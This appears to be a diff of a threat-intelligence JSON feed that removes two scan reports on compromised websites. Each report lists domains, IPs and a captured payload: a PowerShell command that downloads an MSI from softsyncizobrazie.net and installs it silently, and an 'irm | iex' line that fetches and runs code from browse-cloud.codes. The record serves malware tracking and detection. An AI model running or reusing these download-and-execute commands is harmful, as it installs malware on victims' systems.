@@ -11455,46 +11455,5 @@
     ],
     "ReportId": "cmwdxp8ne05qu0omlyd8d0l2n",
     "ScannedAt": "2026-11-12T19:21:49.887000+00:00"
-  },
-  {
-    "UrlDomain": "dawnconcepts.co.za",
-    "DeliveryUrl": [
-      "softsyncizobrazie.net"
-    ],
-    "PayloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "IP": [
-      "129.232.249.216"
-    ],
-    "Related": [],
-    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
-    "ResolvedDownloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "ReportId": "cmwdvqh69058b0omlf4jk9bme",
-    "ScannedAt": "2026-11-12T18:26:48.346000+00:00"
-  },
-  {
-    "UrlDomain": "ctribhovandas.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "162.241.85.104"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/fe2aab3b32968bba",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/fe2aab3b32968bba'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/fe2aab3b32968bba"
-    ],
-    "ReportId": "cmwduvxv605530oml8atdneps",
-    "ScannedAt": "2026-11-12T18:03:03.530000+00:00"
   }
 ]
